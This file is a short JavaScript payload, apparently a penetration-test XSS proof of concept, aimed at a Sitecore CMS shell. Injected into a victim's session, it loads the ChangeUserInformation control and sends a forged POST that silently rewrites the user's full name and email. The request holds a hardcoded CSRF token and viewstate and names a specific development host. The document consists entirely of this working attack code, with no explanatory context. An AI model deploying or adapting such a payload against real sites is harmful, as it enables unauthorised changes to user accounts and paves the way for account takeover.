var req = new XMLHttpRequest();
req.onload = handleResponse;
req.open('get','/sitecore/shell/default.aspx?xmlcontrol=ChangeUserInformation',true);
req.send();
function handleResponse() {
    var changeReq = new XMLHttpRequest();
    changeReq.open('post', '/sitecore/shell/default.aspx?xmlcontrol=ChangeUserInformation', true);
    changeReq.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
    changeReq.send('&__PARAMETERS=&__EVENTTARGET=OK&__EVENTARGUMENT=&__SOURCE=OK&__EVENTTYPE=click&__CONTEXTMENU=&__MODIFIED=&__ISEVENT=1&__SHIFTKEY=&__CTRLKEY=&__ALTKEY=&__BUTTON=0&__KEYCODE=undefined&__X=366&__Y=578&__URL=https%3A//cm.dxp-dev.lenovo.com/sitecore/shell/default.aspx%3Fxmlcontrol%3DChangeUserInformation&__CSRFTOKEN=AAEAAAD%2F%2F%2F%2F%2FAQAAAAAAAAAGAQAAACQyZGUwZDBiNy02N2NjLTQ4NjItODVkNS1lMGY0ZGIwMDUwZTAL&__VIEWSTATE=E8A06F5C2B9F4F29A9AE93E691D701D5&__VIEWSTATE=&Fullname=dxpPentetXSSPOC&Email=lr%40moc.moc')
};
